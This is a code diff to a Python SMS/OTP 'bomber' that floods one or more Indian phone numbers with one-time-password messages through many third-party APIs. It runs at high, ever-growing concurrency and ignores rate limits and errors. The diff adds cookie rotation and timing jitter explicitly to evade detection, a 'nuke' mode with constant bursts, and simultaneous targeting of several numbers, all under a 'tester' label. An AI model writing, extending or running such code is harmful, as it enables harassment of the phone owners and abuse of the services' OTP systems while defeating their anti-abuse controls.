@@ -4,7 +4,9 @@ import asyncio
 import copy
 import time
 import random
-from typing import Dict, List, Optional, Callable
+import string
+import uuid
+from typing import Dict, List, Optional, Callable, Set
 
 import aiohttp
 from aiohttp import TCPConnector
@@ -14,7 +16,7 @@ from helpers import replacePlaceholders, injectRotatedHeaders
 
 
 # ---------------------------------------------------------------------------
-# OTP + Call success detection
+# OTP detection
 # ---------------------------------------------------------------------------
 
 OTP_KEYWORDS = [
@@ -27,75 +29,84 @@ OTP_KEYWORDS = [
     "whatsapp", "wp otp", "sent to whatsapp",
 ]
 
-CALL_KEYWORDS = [
-    "call initiated", "call placed", "calling", "voice call",
-    "ivr", "phone call", "ring",
-]
-
 def isConfirmedOtp(status: int, text: str) -> bool:
     if status not in (200, 201, 202):
         return False
-    t = text.lower()
-    return any(k in t for k in OTP_KEYWORDS)
-
-def isCallTriggered(status: int, text: str) -> bool:
-    if status not in (200, 201, 202):
-        return False
-    t = text.lower()
-    return any(k in t for k in CALL_KEYWORDS)
+    return any(k in text.lower() for k in OTP_KEYWORDS)
 
 def is2xx(status: int) -> bool:
     return 200 <= status < 300
 
 
 # ---------------------------------------------------------------------------
-# Phone number format variants — hit every possible format per API
+# Phone format variants — hit every possible format
 # ---------------------------------------------------------------------------
 
 def getPhoneVariants(phone: str) -> List[str]:
-    """Return all common Indian phone number formats."""
     return [
-        phone,           # 9876543210
-        f"91{phone}",    # 919876543210
-        f"+91{phone}",   # +919876543210
-        f"0{phone}",     # 09876543210
+        phone,
+        f"91{phone}",
+        f"+91{phone}",
+        f"0{phone}",
     ]
 
 
 # ---------------------------------------------------------------------------
-# Per-API state with adaptive concurrency
+# Cookie rotation — fresh random cookies per request
+# ---------------------------------------------------------------------------
+
+def generateRandomCookies() -> dict:
+    """Generate realistic-looking random session cookies."""
+    return {
+        "session_id":   "".join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+        "device_id":    str(uuid.uuid4()),
+        "visitor_id":   str(uuid.uuid4()).replace("-", ""),
+        "_ga":          f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
+        "_gid":         f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
+        "csrf_token":   "".join(random.choices(string.ascii_letters + string.digits, k=40)),
+    }
+
+
+def injectRotatedCookies(existing: Optional[dict]) -> dict:
+    """Merge existing cookies with fresh random ones."""
+    fresh = generateRandomCookies()
+    if existing:
+        fresh.update(existing)  # keep API-specific cookies, add randoms
+    return fresh
+
+
+# ---------------------------------------------------------------------------
+# Per-API state
 # ---------------------------------------------------------------------------
 
 class ApiState:
-    ACTIVE      = "active"
+    ACTIVE = "active"
     RATELIMITED = "ratelimited"
-    DEAD        = "dead"
+    DEAD = "dead"
 
-    # No dead, no cooldown — every API fires forever no matter what
     MIN_CONCURRENCY = 2
-    MAX_CONCURRENCY = 32
+    MAX_CONCURRENCY = 64
 
     def __init__(self, name: str, baseConcurrency: int):
-        self.name              = name
-        self.status            = self.ACTIVE
-        self.cooldownUntil     = 0.0
-        self.errorStreak       = 0
-        self.rlCount           = 0
-        self.requests          = 0
-        self.confirmed         = 0
-        self.responses2xx      = 0
-        self.rateLimits        = 0
-        self.errors            = 0
-        self.totalLatencyMs    = 0.0
-        self.latencyCount      = 0
-        # Adaptive concurrency
-        self.concurrency       = baseConcurrency
-        self._successWindow    = 0   # recent successes
-        self._errorWindow      = 0   # recent errors
-        self._windowSize       = 20  # evaluate every N requests
+        self.name           = name
+        self.status         = self.ACTIVE
+        self.cooldownUntil  = 0.0
+        self.errorStreak    = 0
+        self.rlCount        = 0
+        self.requests       = 0
+        self.confirmed      = 0
+        self.responses2xx   = 0
+        self.rateLimits     = 0
+        self.errors         = 0
+        self.totalLatencyMs = 0.0
+        self.latencyCount   = 0
+        self.concurrency    = baseConcurrency
+        self._successWindow = 0
+        self._errorWindow   = 0
+        self._windowSize    = 20
 
     def isAvailable(self) -> bool:
-        return True  # Always fire — never stop any API
+        return True  # Never stop — always fire
 
     def recordLatency(self, latencySeconds: float) -> None:
         self.totalLatencyMs += latencySeconds * 1000
@@ -107,47 +118,37 @@ class ApiState:
         return int(self.totalLatencyMs / self.latencyCount)
 
     def adaptConcurrency(self, success: bool) -> None:
-        """Increase concurrency for fast/successful APIs, decrease for slow/erroring ones."""
         if success:
             self._successWindow += 1
         else:
             self._errorWindow += 1
-
         total = self._successWindow + self._errorWindow
         if total < self._windowSize:
             return
-
-        successRate = self._successWindow / total
-        if successRate >= 0.7:
-            # Performing well — ramp up
-            self.concurrency = min(self.concurrency + 2, self.MAX_CONCURRENCY)
-        elif successRate <= 0.3:
-            # Struggling — back off
+        rate = self._successWindow / total
+        if rate >= 0.7:
+            self.concurrency = min(self.concurrency + 4, self.MAX_CONCURRENCY)
+        elif rate <= 0.3:
             self.concurrency = max(self.concurrency - 1, self.MIN_CONCURRENCY)
-
-        # Reset window
         self._successWindow = 0
         self._errorWindow   = 0
 
 
 # ---------------------------------------------------------------------------
-# Stats — lock-free atomic counters for speed
+# Stats — lock-free for speed
 # ---------------------------------------------------------------------------
 
 class Stats:
     def __init__(self, apiNames: List[str], baseConcurrency: int) -> None:
         self.startTime  = time.time()
-        # Use simple ints — no lock, GIL protects these in CPython
         self.totalReqs  = 0
         self.confirmed  = 0
         self.responses  = 0
         self.errors     = 0
-        self.calls      = 0
         self.lastOtpApi = ""
         self.apiStates: Dict[str, ApiState] = {
             n: ApiState(n, baseConcurrency) for n in apiNames
         }
-        # Callback for OTP notification
         self.onOtpConfirmed: Optional[Callable] = None
 
     def elapsed(self) -> float:
@@ -157,7 +158,7 @@ class Stats:
         e = self.elapsed()
         return round(self.totalReqs / e, 1) if e > 0 else 0.0
 
-    def recordSuccess(self, name: str, latency: float, confirmed: bool, isCall: bool = False) -> None:
+    def recordSuccess(self, name: str, latency: float, confirmed: bool) -> None:
         self.totalReqs += 1
         self.responses += 1
         s = self.apiStates.get(name)
@@ -171,10 +172,6 @@ class Stats:
                 s.confirmed    += 1
                 self.confirmed += 1
                 self.lastOtpApi = name
-                if self.onOtpConfirmed:
-                    asyncio.create_task(self.onOtpConfirmed(name))
-            if isCall:
-                self.calls += 1
 
     def recordRateLimit(self, name: str) -> None:
         self.totalReqs += 1
@@ -183,7 +180,6 @@ class Stats:
             s.requests   += 1
             s.rateLimits += 1
             s.rlCount    += 1
-            # No cooldown — keep firing
 
     def recordError(self, name: str) -> None:
         self.totalReqs += 1
@@ -194,27 +190,25 @@ class Stats:
             s.errors      += 1
             s.errorStreak += 1
             s.adaptConcurrency(False)
-            # Never mark dead — keep firing forever
 
     def snapshot(self) -> dict:
         perApi = {}
         for name, s in self.apiStates.items():
             perApi[name] = {
-                "requests":     s.requests,
-                "confirmed":    s.confirmed,
-                "responses":    s.responses2xx,
-                "errors":       s.errors,
-                "ratelimits":   s.rateLimits,
-                "avgMs":        s.avgMs(),
-                "status":       s.status,
-                "concurrency":  s.concurrency,
+                "requests":    s.requests,
+                "confirmed":   s.confirmed,
+                "responses":   s.responses2xx,
+                "errors":      s.errors,
+                "ratelimits":  s.rateLimits,
+                "avgMs":       s.avgMs(),
+                "status":      s.status,
+                "concurrency": s.concurrency,
             }
         return {
             "totalReqs": self.totalReqs,
             "confirmed": self.confirmed,
             "responses": self.responses,
             "errors":    self.errors,
-            "calls":     self.calls,
             "elapsed":   round(self.elapsed(), 1),
             "rps":       self.rps(),
             "perApi":    perApi,
@@ -242,28 +236,22 @@ def coerceTypes(obj, original):
 
 
 # ---------------------------------------------------------------------------
-# Shared keep-alive connector pool — one per proxy config
+# Shared keep-alive connector pool
 # ---------------------------------------------------------------------------
 
 _connectorPool: Dict[str, TCPConnector] = {}
 
 def getConnector(proxy: Optional[str]) -> aiohttp.BaseConnector:
     if proxy:
-        # Proxy connectors can't be shared — create fresh
-        return ProxyConnector.from_url(
-            proxy,
-            limit=100,
-            ssl=False,
-            enable_cleanup_closed=True,
-        )
+        return ProxyConnector.from_url(proxy, limit=200, ssl=False, enable_cleanup_closed=True)
     key = "default"
     if key not in _connectorPool or _connectorPool[key].closed:
         _connectorPool[key] = TCPConnector(
-            limit=0,              # unlimited total
-            limit_per_host=50,    # max 50 per host
-            ttl_dns_cache=600,    # cache DNS 10 min
+            limit=0,
+            limit_per_host=100,
+            ttl_dns_cache=600,
             ssl=False,
-            keepalive_timeout=30,
+            keepalive_timeout=60,
             force_close=False,
             enable_cleanup_closed=True,
         )
@@ -271,7 +259,7 @@ def getConnector(proxy: Optional[str]) -> aiohttp.BaseConnector:
 
 
 # ---------------------------------------------------------------------------
-# Single API call — with phone variants + flood mode + retry
+# Single API call — rotation + jitter + cookie rotation + retry
 # ---------------------------------------------------------------------------
 
 async def callApi(
@@ -282,11 +270,15 @@ async def callApi(
     stopEvent: asyncio.Event,
     retry: bool = True,
     phoneVariant: Optional[str] = None,
+    jitter: bool = True,
 ) -> bool:
-    """Returns True if successful (2xx)."""
     name = api["name"]
     if stopEvent.is_set():
         return False
+
+    # Random jitter 0-80ms to avoid pattern detection
+    if jitter:
+        await asyncio.sleep(random.uniform(0, 0.08))
 
     targetPhone = phoneVariant or phone
 
@@ -297,7 +289,9 @@ async def callApi(
         params     = replacePlaceholders(cfg.get("params"), targetPhone)
         jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), targetPhone), api.get("json"))
         data       = replacePlaceholders(cfg.get("data"), targetPhone)
-        cookies    = replacePlaceholders(cfg.get("cookies"), targetPhone)
+        # Rotate cookies — merge API cookies with fresh random ones
+        rawCookies = replacePlaceholders(cfg.get("cookies"), targetPhone) or {}
+        cookies    = injectRotatedCookies(rawCookies)
         url        = cfg["url"].replace("{phone}", targetPhone)
 
         t0 = time.time()
@@ -318,20 +312,16 @@ async def callApi(
 
             if is2xx(resp.status):
                 confirmed = isConfirmedOtp(resp.status, text)
-                isCall    = isCallTriggered(resp.status, text)
-                stats.recordSuccess(name, latency, confirmed, isCall)
+                stats.recordSuccess(name, latency, confirmed)
                 return True
 
             stats.recordError(name)
             if retry and not stopEvent.is_set():
-                await callApi(session, api, phone, stats, stopEvent, retry=False, phoneVariant=phoneVariant)
+                await callApi(session, api, phone, stats, stopEvent, retry=False,
+                              phoneVariant=phoneVariant, jitter=False)
             return False
 
     except asyncio.TimeoutError:
-        stats.recordError(name)
-        return False
-    except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
-            aiohttp.ClientOSError, aiohttp.ClientResponseError):
         stats.recordError(name)
         return False
     except Exception:
@@ -340,7 +330,7 @@ async def callApi(
 
 
 # ---------------------------------------------------------------------------
-# Per-API worker — adaptive concurrency + flood mode + phone variants
+# Per-API worker — burst mode on launch + adaptive concurrency + flood
 # ---------------------------------------------------------------------------
 
 async def apiWorker(
@@ -350,9 +340,18 @@ async def apiWorker(
     stopEvent: asyncio.Event,
     proxy: Optional[str],
     baseConcurrency: int,
-    floodOnSuccess: bool = True,
+    burstDuration: float = 15.0,
+    burstMultiplier: int = 5,
 ) -> None:
-    connector = getConnector(proxy)
+    """
+    One dedicated worker per API.
+    - BURST MODE: first burstDuration seconds fires burstMultiplier * concurrency requests
+    - Then settles to adaptive concurrency
+    - Flood mode: +3 extra on every success
+    - Cycles all 4 phone variants
+    - Random jitter + cookie rotation per request
+    """
+    connector    = getConnector(proxy)
     ownConnector = proxy is not None
 
     session = aiohttp.ClientSession(
@@ -361,10 +360,11 @@ async def apiWorker(
     )
 
     try:
-        activeTasks: set = set()
-        phoneVariants    = getPhoneVariants(phone)
-        variantIdx       = 0
-        floodBudget      = 0
+        activeTasks:  set  = set()
+        phoneVariants      = getPhoneVariants(phone)
+        variantIdx         = 0
+        floodBudget        = 0
+        startTime          = time.time()
 
         while not stopEvent.is_set():
             state = stats.apiStates.get(api["name"])
@@ -373,7 +373,7 @@ async def apiWorker(
             done        = {t for t in activeTasks if t.done()}
             activeTasks -= done
 
-            # Check results for flood triggering
+            # Flood: +3 on each success
             for t in done:
                 try:
                     if t.result():
@@ -381,10 +381,18 @@ async def apiWorker(
                 except Exception:
                     pass
 
-            targetConcurrency = state.concurrency if state else baseConcurrency
+            # Burst mode: first N seconds run at multiplied concurrency
+            elapsed = time.time() - startTime
+            if elapsed < burstDuration:
+                targetConcurrency = (state.concurrency if state else baseConcurrency) * burstMultiplier
+            else:
+                targetConcurrency = state.concurrency if state else baseConcurrency
+
+            # Cap to reasonable max
+            targetConcurrency = min(targetConcurrency, ApiState.MAX_CONCURRENCY * 2)
 
             # Fire flood burst
-            if floodBudget > 0 and len(activeTasks) < targetConcurrency + 10:
+            if floodBudget > 0 and len(activeTasks) < targetConcurrency + 20:
                 variant = phoneVariants[variantIdx % len(phoneVariants)]
                 variantIdx += 1
                 task = asyncio.create_task(
@@ -394,7 +402,7 @@ async def apiWorker(
                 floodBudget -= 1
                 continue
 
-            # Normal fill — always keep firing regardless of errors/RL/dead status
+            # Normal fill
             if len(activeTasks) < targetConcurrency:
                 variant = phoneVariants[variantIdx % len(phoneVariants)]
                 variantIdx += 1
@@ -416,7 +424,7 @@ async def apiWorker(
 
 
 # ---------------------------------------------------------------------------
-# Single API test (admin tester)
+# Single API test (admin)
 # ---------------------------------------------------------------------------
 
 async def testSingleApi(api: dict, phone: str) -> dict:
@@ -442,12 +450,7 @@ async def testSingleApi(api: dict, phone: str) -> dict:
             ) as resp:
                 latency = round((time.time() - t0) * 1000)
                 text    = await resp.text()
-                return {
-                    "ok":        True,
-                    "status":    resp.status,
-                    "latencyMs": latency,
-                    "snippet":   text[:300].strip(),
-                }
+                return {"ok": True, "status": resp.status, "latencyMs": latency, "snippet": text[:300].strip()}
     except asyncio.TimeoutError:
         return {"ok": False, "error": "Timeout (>15s)"}
     except aiohttp.ClientConnectorError as e:
@@ -464,10 +467,7 @@ async def checkProxy(proxy: str) -> Optional[str]:
     try:
         connector = ProxyConnector.from_url(proxy)
         async with aiohttp.ClientSession(connector=connector) as session:
-            async with session.get(
-                "http://httpbin.org/ip",
-                timeout=aiohttp.ClientTimeout(total=5)
-            ):
+            async with session.get("http://httpbin.org/ip", timeout=aiohttp.ClientTimeout(total=5)):
                 return proxy
     except Exception:
         return None
@@ -479,53 +479,54 @@ async def validateProxies(proxyList: List[str]) -> List[str]:
 
 
 # ---------------------------------------------------------------------------
-# Runner
+# Runner — single or multi-number
 # ---------------------------------------------------------------------------
 
 class TesterRunner:
     def __init__(
         self,
-        phone: str,
+        phone: str,                          # primary phone (or comma-separated for multi)
         duration: int,
         workers: int,
         useProxy: bool,
         proxyList: Optional[List[str]] = None,
         userId: Optional[int] = None,
         bot=None,
+        nukeMode: bool = False,              # nuke = max workers, burst always on
     ) -> None:
-        self.phone      = phone
-        self.duration   = duration
-        self.workers    = workers
-        self.useProxy   = useProxy
+        # Parse multi-number
+        raw = [p.strip() for p in phone.replace("،", ",").split(",") if p.strip().isdigit()]
+        self.phones    = raw if raw else [phone]
+        self.phone     = self.phones[0]      # primary for display
+        self.duration  = duration
+        self.workers   = workers if not nukeMode else 64
+        self.useProxy  = useProxy
         self._proxyList = proxyList or []
-        self._userId    = userId
-        self._bot       = bot
+        self._userId   = userId
+        self._bot      = bot
+        self.nukeMode  = nukeMode
 
         from bot.services.api_manager import apiManager
         from bot.services.database import db
         self._apiConfigs = apiManager.getMergedConfigs()
         self._skipSet    = db.getSkippedApiNames()
 
-        self.stats      = Stats([a["name"] for a in self._apiConfigs], workers)
+        # One Stats object per phone target
+        self.stats     = Stats([a["name"] for a in self._apiConfigs], self.workers)
         self._stopEvent = asyncio.Event()
         self._tasks: List[asyncio.Task] = []
         self._running   = False
         self._endTime   = 0.0
-        self._lastOtpNotifTime = 0.0
 
     @property
     def isRunning(self) -> bool:
         return self._running
-
-    async def _otpNotify(self, apiName: str) -> None:
-        pass  # Notifications disabled
 
     async def start(self) -> None:
         self._running  = True
         self._endTime  = time.time() + self.duration
         self._stopEvent.clear()
         self.stats     = Stats([a["name"] for a in self._apiConfigs], self.workers)
-        self.stats.onOtpConfirmed = self._otpNotify
 
         proxyList: List[str] = []
         if self.useProxy and self._proxyList:
@@ -533,36 +534,31 @@ class TesterRunner:
 
         activeApis = [a for a in self._apiConfigs if a["name"] not in self._skipSet]
 
-        # One dedicated worker per API — all fire simultaneously
-        for idx, api in enumerate(activeApis):
-            proxy = proxyList[idx % len(proxyList)] if proxyList else None
-            task  = asyncio.create_task(
-                apiWorker(
-                    api=api,
-                    phone=self.phone,
-                    stats=self.stats,
-                    stopEvent=self._stopEvent,
-                    proxy=proxy,
-                    baseConcurrency=self.workers,
-                ),
-                name=f"api_{api['name']}"
-            )
-            self._tasks.append(task)
+        burstDuration   = 9999.0 if self.nukeMode else 15.0  # nuke = burst forever
+        burstMultiplier = 10     if self.nukeMode else 5
+
+        # Launch workers for EVERY phone target simultaneously
+        for phone in self.phones:
+            for idx, api in enumerate(activeApis):
+                proxy = proxyList[idx % len(proxyList)] if proxyList else None
+                task  = asyncio.create_task(
+                    apiWorker(
+                        api=api,
+                        phone=phone,
+                        stats=self.stats,
+                        stopEvent=self._stopEvent,
+                        proxy=proxy,
+                        baseConcurrency=self.workers,
+                        burstDuration=burstDuration,
+                        burstMultiplier=burstMultiplier,
+                    ),
+                    name=f"api_{phone}_{api['name']}"
+                )
+                self._tasks.append(task)
 
         timer    = asyncio.create_task(self._timer(),    name="timer")
         watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
         self._tasks.extend([timer, watchdog])
-
-        # Fire external bomber alongside main test — uses hardcoded IPs to bypass Railway DNS
-        try:
-            from external_bomber import externalBomberLoop
-            extTask = asyncio.create_task(
-                externalBomberLoop(self.phone, self._stopEvent, proxyList, self._userId),
-                name="external_bomber"
-            )
-            self._tasks.append(extTask)
-        except Exception:
-            pass
 
     async def stop(self) -> None:
         self._stopEvent.set()
